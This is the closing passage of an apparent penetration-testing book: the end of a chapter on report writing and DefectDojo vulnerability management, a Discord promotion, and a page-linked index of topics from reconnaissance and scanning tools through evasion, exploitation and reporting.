| Note: Furthermore, DefectDojo provides various features, including support for defining Service Level Agreements (SLAs) to manage vulnerability remediation timelines effectively. With SLAs in place, security teams can ensure timely resolution of vulnerabilities and maintain compliance with internal or external security standards. |

The credit for developing the DefectDojo tool goes to the professionals who contributed to its creation.

[Conclusion](#contents.xhtml_sc2_291a)

In this chapter, we delved into the crucial art of report writing, which is essential for comprehensive assessments. We explored various aspects, such as the components of well-crafted reports, utilizing CVSS scores, and risk assessment for effective prioritization. We also covered different types of cyber security assessment reports and provided examples of detailed reports for web applications and network VAPT. Furthermore, we learned about the benefits of using automated vulnerability management with DefectDojo. By the end of this chapter, you should have gained valuable insights into creating impactful and standardized reports, effectively communicating assessment findings, and enhancing your overall security assessment process.

Having delved into the VAPT approach, methodology, toolsets, techniques, communication, and reporting throughout this book, you are now equipped with the knowledge to conduct successful assessments. By adopting a systematic approach and utilizing the industry-oriented methodology, you can become a skilled managed pentester or a highly demanded SME in the cybersecurity domain.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# Index

A

AAAA Record [65](#ch03.xhtml_page65)

A (Address) Records [65](#ch03.xhtml_page65)

Access Points (APs) [216](#ch07.xhtml_page216)

Active Directory (AD) network [257](#ch08.xhtml_page257)

active reconnaissance [62](#ch03.xhtml_page62)

active reconnaissance tools and tactics

directory enumeration [83](#ch03.xhtml_page83), [84](#ch03.xhtml_page84)

hard-coded information [84](#ch03.xhtml_page84), [85](#ch03.xhtml_page85)

host discovery [76](#ch03.xhtml_page76), [77](#ch03.xhtml_page77)

ND ping [78](#ch03.xhtml_page78)

OS fingerprinting [82](#ch03.xhtml_page82)

port scanning [79](#ch03.xhtml_page79)

services and version detection [81](#ch03.xhtml_page81)

Address Resolution Protocol (ARP) [78](#ch03.xhtml_page78)

advanced penetration testing techniques [4](#ch01.xhtml_page4), [5](#ch01.xhtml_page5)

advanced wireless attacks [218](#ch07.xhtml_page218)

wireless routers, attacking with Reaver [218](#ch07.xhtml_page218)

advancements, in security controls

cloud-specific security controls [264](#ch09.xhtml_page264)

cutting-edge technologies [263](#ch09.xhtml_page263)

Intelligent systems [264](#ch09.xhtml_page264)

threat landscape, evolving [264](#ch09.xhtml_page264)

Aircrack-ng [201](#ch07.xhtml_page201)

Antimalware Scan Interface (AMSI) trigger [273](#ch09.xhtml_page273)

antivirus evasion techniques [277](#ch09.xhtml_page277), [278](#ch09.xhtml_page278)

antivirus evasion tools [278](#ch09.xhtml_page278)

custom binaries [280](#ch09.xhtml_page280)

Invoke-Stealth [299](#ch09.xhtml_page299)-[302](#ch09.xhtml_page302)

Metasploit templates [279](#ch09.xhtml_page279)-[289](#ch09.xhtml_page289)

Phantom-Evasion [296](#ch09.xhtml_page296)-[298](#ch09.xhtml_page298)

Shellter [290](#ch09.xhtml_page290)-[293](#ch09.xhtml_page293)

Unicorn [294](#ch09.xhtml_page294)-[296](#ch09.xhtml_page296)

application security [126](#ch04.xhtml_page126)

application-specific vulnerabilities

backdoor, via unrestricted file upload [184](#ch06.xhtml_page184)-[186](#ch06.xhtml_page186)

broken authentication [174](#ch06.xhtml_page174)-[176](#ch06.xhtml_page176)

brute force [171](#ch06.xhtml_page171)-[174](#ch06.xhtml_page174)

exploiting [163](#ch06.xhtml_page163)

HTTP parameter pollution [187](#ch06.xhtml_page187)-[189](#ch06.xhtml_page189)

Insecure Direct Object Reference (IDOR) [177](#ch06.xhtml_page177), [178](#ch06.xhtml_page178)

PHP code execution [169](#ch06.xhtml_page169), [170](#ch06.xhtml_page170)

SQL injection [164](#ch06.xhtml_page164)-[168](#ch06.xhtml_page168)

XSS, using XSS validator [179](#ch06.xhtml_page179)-[183](#ch06.xhtml_page183)

AppSec [126](#ch04.xhtml_page126)

Armitage [147](#ch05.xhtml_page147)

setting up [148](#ch05.xhtml_page148), [149](#ch05.xhtml_page149)

using [150](#ch05.xhtml_page150)-[152](#ch05.xhtml_page152)

using, for exploitation [147](#ch05.xhtml_page147), [148](#ch05.xhtml_page148)

automated vulnerability management

with DefectDojo [349](#ch10.xhtml_page349)

auxiliary modules [140](#ch05.xhtml_page140)

B

backdoor [184](#ch06.xhtml_page184)

via unrestricted file upload [184](#ch06.xhtml_page184)-[186](#ch06.xhtml_page186)

broken authentication [174](#ch06.xhtml_page174)-[176](#ch06.xhtml_page176)

brute force login attacks [171](#ch06.xhtml_page171)-[174](#ch06.xhtml_page174)

Buggy Web Application (BWAPP) [54](#ch02.xhtml_page54), [164](#ch06.xhtml_page164)

setting up, on Windows VM [54](#ch02.xhtml_page54)-[56](#ch02.xhtml_page56)

Burp suite [100](#ch04.xhtml_page100)

authenticated scan [102](#ch04.xhtml_page102)

configuring [101](#ch04.xhtml_page101)

launching [101](#ch04.xhtml_page101)

results, analyzing [103](#ch04.xhtml_page103)

scan, initiating [102](#ch04.xhtml_page102)

business logic flaws [189](#ch06.xhtml_page189)-[193](#ch06.xhtml_page193)

bypassing security controls

significance [262](#ch09.xhtml_page262), [263](#ch09.xhtml_page263)

C

Center for Internet Security (CIS) [15](#ch01.xhtml_page15), [264](#ch09.xhtml_page264)

Cloud Controls Matrix (CCM) [264](#ch09.xhtml_page264)

Cloud Security Alliance (CSA) [264](#ch09.xhtml_page264)

cloud-specific security controls

Cloud Security Matrix (CSM) [264](#ch09.xhtml_page264)

Cloud Security Posture Management (CSPM) [264](#ch09.xhtml_page264)

CNAME (Canonical Name) Record [65](#ch03.xhtml_page65)

Common Vulnerabilities and Exposures (CVE) [96](#ch04.xhtml_page96), [120](#ch04.xhtml_page120)

Common Vulnerability Scoring System (CVSS) [11](#ch01.xhtml_page11), [336](#ch10.xhtml_page336)

factors influencing, scores [336](#ch10.xhtml_page336), [337](#ch10.xhtml_page337)

scores, applying [337](#ch10.xhtml_page337)-[339](#ch10.xhtml_page339)

scores, interpreting [337](#ch10.xhtml_page337)

Common Weakness Enumeration (CWE) [96](#ch04.xhtml_page96)

containers [120](#ch04.xhtml_page120)

CrackStation [232](#ch08.xhtml_page232), [233](#ch08.xhtml_page233)

Critical Information Infrastructure (CII) [15](#ch01.xhtml_page15)

Cross Site Scripting (XSS) [179](#ch06.xhtml_page179)

Customer Success Management [23](#ch01.xhtml_page23)

customer success tactics

customer feedback [24](#ch01.xhtml_page24)

knowledge sharing [23](#ch01.xhtml_page23)

long-term relationship [24](#ch01.xhtml_page24)

personalized attention [23](#ch01.xhtml_page23)

post-assessment support [23](#ch01.xhtml_page23), [24](#ch01.xhtml_page24)

proactive communication [23](#ch01.xhtml_page23)

cutting-edge technologies, security controls

AI-driven threat intelligence [263](#ch09.xhtml_page263)

behaviour-based anomaly detection [263](#ch09.xhtml_page263)

Next-Gen firewalls [263](#ch09.xhtml_page263)

cutting-edge WAF evasion tactics [302](#ch09.xhtml_page302)-[306](#ch09.xhtml_page306)

cybersecurity assessment reports

detailed technical assessment report [341](#ch10.xhtml_page341)

executive summary report [340](#ch10.xhtml_page340), [341](#ch10.xhtml_page341)

cybersecurity practices , security controls

advanced malware detection with machine learning [264](#ch09.xhtml_page264)

zero trust architecture [264](#ch09.xhtml_page264)

D

Data Loss Prevention (DLP) [262](#ch09.xhtml_page262)

DefectDojo [349](#ch10.xhtml_page349)

benefits [349](#ch10.xhtml_page349)

features [349](#ch10.xhtml_page349)-[351](#ch10.xhtml_page351)

for automated vulnerability management [349](#ch10.xhtml_page349)

Dehashed [76](#ch03.xhtml_page76)

Denial-of-Service (DoS) Attacks [196](#ch07.xhtml_page196)

detailed technical assessment report [341](#ch10.xhtml_page341)

directory enumeration [83](#ch03.xhtml_page83), [84](#ch03.xhtml_page84)

Docker

autostart, enabling [121](#ch04.xhtml_page121)

images, listing [121](#ch04.xhtml_page121)

installing [121](#ch04.xhtml_page121)

report, converting [124](#ch04.xhtml_page124)

report, generating [124](#ch04.xhtml_page124)

scan, analyzing [123](#ch04.xhtml_page123)

scan, running [122](#ch04.xhtml_page122)

unfixable vulnerabilities, ignoring [122](#ch04.xhtml_page122)

vulnerable image, pulling [121](#ch04.xhtml_page121)

Document Object Model (DOM) [179](#ch06.xhtml_page179)

Domain Name System (DNS) reconnaissance [65](#ch03.xhtml_page65)

utilizing [65](#ch03.xhtml_page65)-[68](#ch03.xhtml_page68)

Dynamic Application Security Testing (DAST) [126](#ch04.xhtml_page126)

E

EmailHarvester [74](#ch03.xhtml_page74)

encoding [235](#ch08.xhtml_page235)

encryption [235](#ch08.xhtml_page235)

essential tools, for hash experts

hashcat [230](#ch08.xhtml_page230), [231](#ch08.xhtml_page231)

hash-identifier [227](#ch08.xhtml_page227), [228](#ch08.xhtml_page228)

John the Ripper [228](#ch08.xhtml_page228)-[230](#ch08.xhtml_page230)

John the Ripper Jumbo [230](#ch08.xhtml_page230)

executive summary report [340](#ch10.xhtml_page340), [341](#ch10.xhtml_page341)

exploitation

using Armitage [147](#ch05.xhtml_page147), [148](#ch05.xhtml_page148)

exploit modules [141](#ch05.xhtml_page141)

F

FIN scan [81](#ch03.xhtml_page81)

Fully Undetectable (FUD) [4](#ch01.xhtml_page4), [270](#ch09.xhtml_page270)

G

Gantt chart [21](#ch01.xhtml_page21)

General Extensible Templates (GET) parameter [164](#ch06.xhtml_page164)

Gophish [310](#ch09.xhtml_page310)

setting up [310](#ch09.xhtml_page310)-[315](#ch09.xhtml_page315)

Graphics Processing Units (GPUs) [230](#ch08.xhtml_page230)

H

hash algorithms [223](#ch08.xhtml_page223)

Message Digest Algorithm 5 (MD5) [223](#ch08.xhtml_page223)

Secure Hash Algorithm 1 (SHA-1) [223](#ch08.xhtml_page223)

Secure Hash Algorithm 256-bit (SHA-256) [223](#ch08.xhtml_page223)

hashcat [230](#ch08.xhtml_page230), [231](#ch08.xhtml_page231)

hash cracking [227](#ch08.xhtml_page227)

essential tools, for hash warriors [227](#ch08.xhtml_page227)

hash cracking techniques [226](#ch08.xhtml_page226)

strategic approaches [226](#ch08.xhtml_page226), [227](#ch08.xhtml_page227)

Hashes

using [233](#ch08.xhtml_page233), [234](#ch08.xhtml_page234)

hash functions

exploring [222](#ch08.xhtml_page222)

properties [223](#ch08.xhtml_page223)

purpose [223](#ch08.xhtml_page223)

hash-identifier [227](#ch08.xhtml_page227), [228](#ch08.xhtml_page228)

hashing [235](#ch08.xhtml_page235)

hash values [223](#ch08.xhtml_page223)

Have I Been Pwned [76](#ch03.xhtml_page76)

HoaxShell [274](#ch09.xhtml_page274)

host discovery [76](#ch03.xhtml_page76), [77](#ch03.xhtml_page77)

ICMP ping types [78](#ch03.xhtml_page78)

IP protocol ping [78](#ch03.xhtml_page78)

list scan [77](#ch03.xhtml_page77)

No ARP [78](#ch03.xhtml_page78)

No ping scan [77](#ch03.xhtml_page77)

No port scan [77](#ch03.xhtml_page77)

SCTP INIT ping [78](#ch03.xhtml_page78)

TCP ACK ping [78](#ch03.xhtml_page78)

TCP SYN ping [78](#ch03.xhtml_page78)

UDP ping [78](#ch03.xhtml_page78)

HTTP parameter pollution [187](#ch06.xhtml_page187)-[189](#ch06.xhtml_page189)

I

industrial approach and methodology, VAPT

active intelligence [9](#ch01.xhtml_page9)

automated VA scan [10](#ch01.xhtml_page10)

goals and objectives [7](#ch01.xhtml_page7)

intelligence gathering [8](#ch01.xhtml_page8)

kickoff meeting [8](#ch01.xhtml_page8)

manual VA scan [10](#ch01.xhtml_page10)

passive intelligence [8](#ch01.xhtml_page8)

penetration testing [10](#ch01.xhtml_page10)

post exploitation [10](#ch01.xhtml_page10), [11](#ch01.xhtml_page11)

reporting [11](#ch01.xhtml_page11)

threat modeling [9](#ch01.xhtml_page9)

vulnerability assessment [9](#ch01.xhtml_page9)

Information Communication Technology (ICT) [6](#ch01.xhtml_page6)

Information Security Management System (ISMS) [14](#ch01.xhtml_page14)

Infrastructure as Code (IaC) [120](#ch04.xhtml_page120)

Insecure Direct Object Reference (IDOR) [177](#ch06.xhtml_page177), [178](#ch06.xhtml_page178)

Institute for Security and Open Methodologies (ISECOM) [13](#ch01.xhtml_page13)

Intelligent systems, security controls [264](#ch09.xhtml_page264)

automation and orchestration [264](#ch09.xhtml_page264)

machine learning and artificial intelligence [264](#ch09.xhtml_page264)

Internet Control Message Protocol (ICMP) [78](#ch03.xhtml_page78)

Internet of Things (IoT) [16](#ch01.xhtml_page16)

Internet Protocol (IP) [78](#ch03.xhtml_page78)

Intrusion Detection Systems (IDS) [262](#ch09.xhtml_page262)

Invoke-Stealth

usage [299](#ch09.xhtml_page299)-[301](#ch09.xhtml_page301)

IP reconnaissance [68](#ch03.xhtml_page68), [69](#ch03.xhtml_page69)

ISACA [15](#ch01.xhtml_page15)

ISO 27001 standards [14](#ch01.xhtml_page14)

J

John the Ripper [228](#ch08.xhtml_page228)-[230](#ch08.xhtml_page230)

John the Ripper Jumbo [230](#ch08.xhtml_page230)

K

Kali Linux [28](#ch02.xhtml_page28), [197](#ch07.xhtml_page197)

additional applications, installing [42](#ch02.xhtml_page42)

configuring, for wireless attacks [203](#ch07.xhtml_page203)-[207](#ch07.xhtml_page207)

configuring, for wireless pentesting [202](#ch07.xhtml_page202), [203](#ch07.xhtml_page203)

desktop environment, changing [41](#ch02.xhtml_page41), [42](#ch02.xhtml_page42)

features [28](#ch02.xhtml_page28), [29](#ch02.xhtml_page29)

installing, on VirtualBox [35](#ch02.xhtml_page35)-[37](#ch02.xhtml_page37)

installing, on VMware workstation [31](#ch02.xhtml_page31)-[34](#ch02.xhtml_page34)

login screen, changing [43](#ch02.xhtml_page43)

personalizing [41](#ch02.xhtml_page41)

refreshing [44](#ch02.xhtml_page44)

system settings, modifying [42](#ch02.xhtml_page42)

updating [44](#ch02.xhtml_page44), [45](#ch02.xhtml_page45)

Kali Linux 2023.2

deploying [30](#ch02.xhtml_page30), [31](#ch02.xhtml_page31)

network services, arranging [37](#ch02.xhtml_page37)-[39](#ch02.xhtml_page39)

ProxyChains, setting up [39](#ch02.xhtml_page39), [40](#ch02.xhtml_page40)

key stretching [225](#ch08.xhtml_page225)

Kismet [201](#ch07.xhtml_page201)

L

lateral movement

significance [236](#ch08.xhtml_page236)

Legion

installing [109](#ch04.xhtml_page109)

launching [109](#ch04.xhtml_page109)

results, analyzing [111](#ch04.xhtml_page111)

scan, configuring [109](#ch04.xhtml_page109)

scan, initiating [110](#ch04.xhtml_page110)

Linux password hashing

bcrypt [225](#ch08.xhtml_page225)

MD5 [225](#ch08.xhtml_page225)

scrypt [225](#ch08.xhtml_page225)

SHA-1 [225](#ch08.xhtml_page225)

SHA-256 [225](#ch08.xhtml_page225)

Load Balancer (LB) [162](#ch06.xhtml_page162)

detecting [163](#ch06.xhtml_page163)

M

Maltego [85](#ch03.xhtml_page85), [86](#ch03.xhtml_page86)

IP Address information, gathering [86](#ch03.xhtml_page86)

specific person information, gathering [87](#ch03.xhtml_page87)

specific phone number information, gathering [88](#ch03.xhtml_page88)

Man-in-the-Middle (MITM) Attacks [196](#ch07.xhtml_page196), [198](#ch07.xhtml_page198)

manual exploitation [146](#ch05.xhtml_page146), [147](#ch05.xhtml_page147)

Media Access Control (MAC) [78](#ch03.xhtml_page78)

Message Digest Algorithm 5 (MD5) [223](#ch08.xhtml_page223)

message digests [223](#ch08.xhtml_page223)

Metasploit [131](#ch05.xhtml_page131), [132](#ch05.xhtml_page132)

automation [138](#ch05.xhtml_page138), [139](#ch05.xhtml_page139)

database and workspace management [132](#ch05.xhtml_page132)-[134](#ch05.xhtml_page134)

NMAP scans, integrating with [135](#ch05.xhtml_page135)-[138](#ch05.xhtml_page138)

Metasploitable 2 [52](#ch02.xhtml_page52)

setting up [53](#ch02.xhtml_page53), [54](#ch02.xhtml_page54)

Mimikatz

integration, within meterpreter [257](#ch08.xhtml_page257)-[259](#ch08.xhtml_page259)

MITRE ATT&CK framework [16](#ch01.xhtml_page16)

mobile application vulnerability scan [115](#ch04.xhtml_page115), [116](#ch04.xhtml_page116)

containers [120](#ch04.xhtml_page120)

MobSF [116](#ch04.xhtml_page116), [117](#ch04.xhtml_page117)

Trivy [120](#ch04.xhtml_page120)

Mobile Security Framework (MobSF) [45](#ch02.xhtml_page45), [46](#ch02.xhtml_page46), [116](#ch04.xhtml_page116)

mobile app, uploading [117](#ch04.xhtml_page117)

MobSF Scorecard [119](#ch04.xhtml_page119)

opening [116](#ch04.xhtml_page116)

report, generating [118](#ch04.xhtml_page118)

results, analyzing [118](#ch04.xhtml_page118)

running, on Kali Linux [46](#ch02.xhtml_page46)-[48](#ch02.xhtml_page48)

setting up, in Kali Linux [49](#ch02.xhtml_page49)

static analysis, selecting [116](#ch04.xhtml_page116)

MobSF container [50](#ch02.xhtml_page50)

MobSF Docker image [49](#ch02.xhtml_page49)

MobSF Web Interface [50](#ch02.xhtml_page50)

MX (Mail Exchange) Records [65](#ch03.xhtml_page65)

My Traceroute (MTR) [73](#ch03.xhtml_page73)

N

National Institute of Standards and Technology (NIST) [264](#ch09.xhtml_page264)

Neighbor Discovery (ND) [78](#ch03.xhtml_page78)

Nessus [104](#ch04.xhtml_page104), [105](#ch04.xhtml_page105)

installing [105](#ch04.xhtml_page105)

scan, creating [106](#ch04.xhtml_page106)

scan, launching [107](#ch04.xhtml_page107)

scan results, analyzing [108](#ch04.xhtml_page108)

scan settings, customizing [106](#ch04.xhtml_page106)

target IP addresses, specifying [107](#ch04.xhtml_page107)

user account, creating [105](#ch04.xhtml_page105)

using [105](#ch04.xhtml_page105)

NetStumbler [201](#ch07.xhtml_page201)

network pen testing [130](#ch05.xhtml_page130), [131](#ch05.xhtml_page131)

network pivoting

by exploiting Metasploitable 2 machine [250](#ch08.xhtml_page250)

exploring [246](#ch08.xhtml_page246), [247](#ch08.xhtml_page247)

initial access, gaining to Windows 7 [247](#ch08.xhtml_page247), [248](#ch08.xhtml_page248)

network info gathering [248](#ch08.xhtml_page248)-[250](#ch08.xhtml_page250)

pivot connection establishment [248](#ch08.xhtml_page248)-[252](#ch08.xhtml_page252)

network services

arranging [37](#ch02.xhtml_page37)-[39](#ch02.xhtml_page39)

Network VAPT report

writing [345](#ch10.xhtml_page345)-[348](#ch10.xhtml_page348)

network vulnerability assessment [104](#ch04.xhtml_page104)

Legion [109](#ch04.xhtml_page109)

Nessus [104](#ch04.xhtml_page104)

Nmap [111](#ch04.xhtml_page111)

NIST Cybersecurity Framework [14](#ch01.xhtml_page14)

functions [14](#ch01.xhtml_page14)

Nmap

output, writing [113](#ch04.xhtml_page113)

scan speed, regulating [114](#ch04.xhtml_page114)

scan timing, adjusting [113](#ch04.xhtml_page113)

targets, specifying [112](#ch04.xhtml_page112)

vulnerability, conducting [111](#ch04.xhtml_page111)

Nmap scan

integrating, with Metasploit [135](#ch05.xhtml_page135)-[138](#ch05.xhtml_page138)

Nmap Scripting Engine (NSE) [111](#ch04.xhtml_page111)

NS (Name Server) Record [65](#ch03.xhtml_page65)

Null scan [81](#ch03.xhtml_page81)

O

online tools, for hash experts

CrackStation [232](#ch08.xhtml_page232), [233](#ch08.xhtml_page233)

Hashes [233](#ch08.xhtml_page233), [234](#ch08.xhtml_page234)

Open Source Intelligence (OSINT) [59](#ch03.xhtml_page59)

Open Web Application Security Project (OWASP) [12](#ch01.xhtml_page12)

Operating System (OS) fingerprinting [82](#ch03.xhtml_page82)

Operational Technology (OT) [16](#ch01.xhtml_page16)

OSSTMM [13](#ch01.xhtml_page13)

OWASP ZAP

configuring [98](#ch04.xhtml_page98), [99](#ch04.xhtml_page99)

installing [98](#ch04.xhtml_page98)

launching [98](#ch04.xhtml_page98)

results, analyzing [100](#ch04.xhtml_page100)

scan, initiating [99](#ch04.xhtml_page99)

P

passive reconnaissance [62](#ch03.xhtml_page62)

passive reconnaissance tools and tactics [62](#ch03.xhtml_page62)

DNS reconnaissance [65](#ch03.xhtml_page65)-[68](#ch03.xhtml_page68)

email addresses [74](#ch03.xhtml_page74), [75](#ch03.xhtml_page75)

IP reconnaissance [68](#ch03.xhtml_page68), [69](#ch03.xhtml_page69)

name and phone number [75](#ch03.xhtml_page75)

password or breach data dump [75](#ch03.xhtml_page75), [76](#ch03.xhtml_page76)

route mapping [72](#ch03.xhtml_page72)-[74](#ch03.xhtml_page74)

Shodan [70](#ch03.xhtml_page70)-[72](#ch03.xhtml_page72)

WHOIS [63](#ch03.xhtml_page63)-[65](#ch03.xhtml_page65)

Password Checkup [76](#ch03.xhtml_page76)

password hashing

cutting-edge techniques [225](#ch08.xhtml_page225)

Linux password hashing [225](#ch08.xhtml_page225)

mastering [224](#ch08.xhtml_page224)

passwords, securing [224](#ch08.xhtml_page224)

Windows password hashing [224](#ch08.xhtml_page224)

PathPing command [73](#ch03.xhtml_page73)

Penetration Testing Execution Standard (PTES) [13](#ch01.xhtml_page13)

Penetration Testing (PT) [1](#ch01.xhtml_page1), [4](#ch01.xhtml_page4)

Penetration Testing (PT) report [333](#ch10.xhtml_page333)

People, Process, and Technology (PPT) framework [1](#ch01.xhtml_page1)

persistence and lateral movement [252](#ch08.xhtml_page252)

RDP, exploring [255](#ch08.xhtml_page255)-[257](#ch08.xhtml_page257)

strategies [252](#ch08.xhtml_page252), [253](#ch08.xhtml_page253)

through, hashdump techniques [253](#ch08.xhtml_page253), [254](#ch08.xhtml_page254)

Phantom-Evasion [296](#ch09.xhtml_page296)

usage [296](#ch09.xhtml_page296)-[298](#ch09.xhtml_page298)

phishing [308](#ch09.xhtml_page308)

Gophish [310](#ch09.xhtml_page310)

security assessment, conducting [308](#ch09.xhtml_page308), [309](#ch09.xhtml_page309)

PHP code execution [169](#ch06.xhtml_page169), [170](#ch06.xhtml_page170)

ping [73](#ch03.xhtml_page73)

port scanning [79](#ch03.xhtml_page79)

FIN scan [81](#ch03.xhtml_page81)

Null scan [81](#ch03.xhtml_page81)

Stealth scan (Half open scan) [80](#ch03.xhtml_page80)

TCP scan [80](#ch03.xhtml_page80)

techniques [79](#ch03.xhtml_page79), [80](#ch03.xhtml_page80)

UDP scan [80](#ch03.xhtml_page80)

Xmas scan [81](#ch03.xhtml_page81)

post-exploitation [235](#ch08.xhtml_page235), [236](#ch08.xhtml_page236)

post-exploitation modules [141](#ch05.xhtml_page141)-[145](#ch05.xhtml_page145)

pre-engagement interaction with customers [16](#ch01.xhtml_page16)

approach and methodology selection [18](#ch01.xhtml_page18)

audit scope, defining [16](#ch01.xhtml_page16)

deliverables [19](#ch01.xhtml_page19)

engagement rules [19](#ch01.xhtml_page19)

environment selection [18](#ch01.xhtml_page18)

exercise nature [17](#ch01.xhtml_page17)

exercise time selection [18](#ch01.xhtml_page18)

project timeline [19](#ch01.xhtml_page19)

testing method [17](#ch01.xhtml_page17)

privilege escalation, on Linux [236](#ch08.xhtml_page236)

initial access [237](#ch08.xhtml_page237)

preparing, for Udev exploit [237](#ch08.xhtml_page237)-[239](#ch08.xhtml_page239)

privileges, escalating [239](#ch08.xhtml_page239)-[241](#ch08.xhtml_page241)

privilege escalation, on Windows [241](#ch08.xhtml_page241)

initial access [242](#ch08.xhtml_page242)-[244](#ch08.xhtml_page244)

preparing, for using bypass UAC [244](#ch08.xhtml_page244)

privileges, escalating [245](#ch08.xhtml_page245), [246](#ch08.xhtml_page246)

process hollowing [290](#ch09.xhtml_page290)

Process Identifier (PID) [240](#ch08.xhtml_page240)

project governance, VAPT [23](#ch01.xhtml_page23)

Project Management Office (PMO) [22](#ch01.xhtml_page22)

project management, VAPT [21](#ch01.xhtml_page21), [22](#ch01.xhtml_page22)

project planning, VAPT [20](#ch01.xhtml_page20), [21](#ch01.xhtml_page21)

ProxyChains

enabling [39](#ch02.xhtml_page39)

setting up, in Kali Linux 2023.2 [39](#ch02.xhtml_page39), [40](#ch02.xhtml_page40)

use cases [41](#ch02.xhtml_page41)

PTR (Pointer) Records [65](#ch03.xhtml_page65)

R

RACI matrix [8](#ch01.xhtml_page8)

Radio Frequency (RF) [198](#ch07.xhtml_page198)

Reaver [201](#ch07.xhtml_page201)

reconnaissance [60](#ch03.xhtml_page60)

active reconnaissance [62](#ch03.xhtml_page62)

additional resources [85](#ch03.xhtml_page85)

importance [61](#ch03.xhtml_page61)

passive reconnaissance [62](#ch03.xhtml_page62)

tactics [61](#ch03.xhtml_page61)

types [61](#ch03.xhtml_page61)

Remote Desktop Protocol (RDP) [255](#ch08.xhtml_page255)

reporting [11](#ch01.xhtml_page11)

detailed technical report [11](#ch01.xhtml_page11)

security posture, executive summary [11](#ch01.xhtml_page11)

vulnerability management tracker [12](#ch01.xhtml_page12)

report writing

overview [318](#ch10.xhtml_page318)

reports, integrating in comprehensive assessments [319](#ch10.xhtml_page319)

significance, cybersecurity [318](#ch10.xhtml_page318), [319](#ch10.xhtml_page319)

Reverse IP lookup search [69](#ch03.xhtml_page69)

risk assessment and prioritization [334](#ch10.xhtml_page334)

risks quantifying [334](#ch10.xhtml_page334), [335](#ch10.xhtml_page335)

route mapping [72](#ch03.xhtml_page72)

performing [73](#ch03.xhtml_page73)

S

salting [225](#ch08.xhtml_page225)

Scope of Work (SOW) [19](#ch01.xhtml_page19)

designing, for security audits [19](#ch01.xhtml_page19), [20](#ch01.xhtml_page20)

Secure Hash Algorithm 1 (SHA-1) [223](#ch08.xhtml_page223)

Secure Hash Algorithm 256-bit (SHA-256) [223](#ch08.xhtml_page223)

security audit standards and frameworks

best practices [12](#ch01.xhtml_page12)

CIS benchmarks [15](#ch01.xhtml_page15)

CWE/SANS top 25 [12](#ch01.xhtml_page12), [13](#ch01.xhtml_page13)

ISACA standards and guidelines [15](#ch01.xhtml_page15)

ISO 27001 standards [14](#ch01.xhtml_page14), [15](#ch01.xhtml_page15)

MITRE framework [16](#ch01.xhtml_page16)

NIST Cybersecurity Framework [14](#ch01.xhtml_page14)

open web application security project standard [12](#ch01.xhtml_page12)

OSSTMM [13](#ch01.xhtml_page13)

Penetration Testing Execution Standard (PTES) [13](#ch01.xhtml_page13)

security control bypass, in network recon [265](#ch09.xhtml_page265)

custom packet creation [267](#ch09.xhtml_page267), [268](#ch09.xhtml_page268)

IP address spoofing/decoy IP [266](#ch09.xhtml_page266)

MAC address spoofing [267](#ch09.xhtml_page267)

Nmap Scripting Engine (NSE) scripts [269](#ch09.xhtml_page269)

packet fragmentation [266](#ch09.xhtml_page266)

source port manipulation [265](#ch09.xhtml_page265)

security controls

advancements [263](#ch09.xhtml_page263)

Security Operations Centers (SOC) [16](#ch01.xhtml_page16)

Server Message Block (SMB) protocol [247](#ch08.xhtml_page247)

Shellter [290](#ch09.xhtml_page290)

installing [290](#ch09.xhtml_page290)

launching [290](#ch09.xhtml_page290), [291](#ch09.xhtml_page291)

working with [291](#ch09.xhtml_page291)-[293](#ch09.xhtml_page293)

Shodan [70](#ch03.xhtml_page70)

using [70](#ch03.xhtml_page70)-[72](#ch03.xhtml_page72)

social engineering tactics [306](#ch09.xhtml_page306), [307](#ch09.xhtml_page307)

phishing simulation [308](#ch09.xhtml_page308)

Software Development Life Cycle (SDLC) [18](#ch01.xhtml_page18)

SPARTA [88](#ch03.xhtml_page88)

installing [88](#ch03.xhtml_page88)-[90](#ch03.xhtml_page90)

SpyCloud [76](#ch03.xhtml_page76)

SQL injection [164](#ch06.xhtml_page164)

blind SQL injection [164](#ch06.xhtml_page164)

in-band SQL injection [164](#ch06.xhtml_page164)

out-of-band SQL injection [164](#ch06.xhtml_page164)

Static Application Security Testing (SAST) [126](#ch04.xhtml_page126)

Stealth scan (half open scan) [80](#ch03.xhtml_page80)

strategic approaches, hash cracking

brute force attacks [226](#ch08.xhtml_page226)

dictionary attacks [226](#ch08.xhtml_page226)

hybrid attacks [226](#ch08.xhtml_page226)

rainbow table attacks [227](#ch08.xhtml_page227)

rule-based attacks [227](#ch08.xhtml_page227)

Stream Control Transmission Protocol (SCTP) INIT packet [78](#ch03.xhtml_page78)

SYN scan [80](#ch03.xhtml_page80)

SysAdmin, Audit, Network, and Security (SANS) Institute [12](#ch01.xhtml_page12)

T

Tactics, Techniques, and Procedures (TTPs) [16](#ch01.xhtml_page16)

TCP scan [80](#ch03.xhtml_page80)

testing methods, VAPT [17](#ch01.xhtml_page17)

black box [17](#ch01.xhtml_page17)

grey box [18](#ch01.xhtml_page18)

white box [18](#ch01.xhtml_page18)

third-party VAPT tools

enabling [45](#ch02.xhtml_page45)

MobSF [46](#ch02.xhtml_page46)-[50](#ch02.xhtml_page50)

Trivy [51](#ch02.xhtml_page51), [52](#ch02.xhtml_page52)

threat modeling [159](#ch06.xhtml_page159)

architecture, defining [159](#ch06.xhtml_page159)

assets, identifying [159](#ch06.xhtml_page159)

mitigation strategies, developing [160](#ch06.xhtml_page160)

potential threats, identifying [159](#ch06.xhtml_page159)

risks, analyzing [160](#ch06.xhtml_page160)

threats, prioritizing [160](#ch06.xhtml_page160)

web application, testing [160](#ch06.xhtml_page160)

traceroute command [73](#ch03.xhtml_page73)

traceroute tool

using [73](#ch03.xhtml_page73)

Trivy [51](#ch02.xhtml_page51), [120](#ch04.xhtml_page120)

setting up [51](#ch02.xhtml_page51), [52](#ch02.xhtml_page52)

TXT Records [65](#ch03.xhtml_page65)

U

UDP scan [80](#ch03.xhtml_page80)

Unicorn [294](#ch09.xhtml_page294)

using [294](#ch09.xhtml_page294)-[296](#ch09.xhtml_page296)

User Account Control (UAC) [244](#ch08.xhtml_page244)

User Datagram Protocol (UDP) packet [78](#ch03.xhtml_page78)

V

VAPT lab [27](#ch02.xhtml_page27)

VAPT report

Annexure-1 [329](#ch10.xhtml_page329)

Annexure-2 [330](#ch10.xhtml_page330)-[332](#ch10.xhtml_page332)

components [319](#ch10.xhtml_page319), [320](#ch10.xhtml_page320)

cover page [320](#ch10.xhtml_page320)

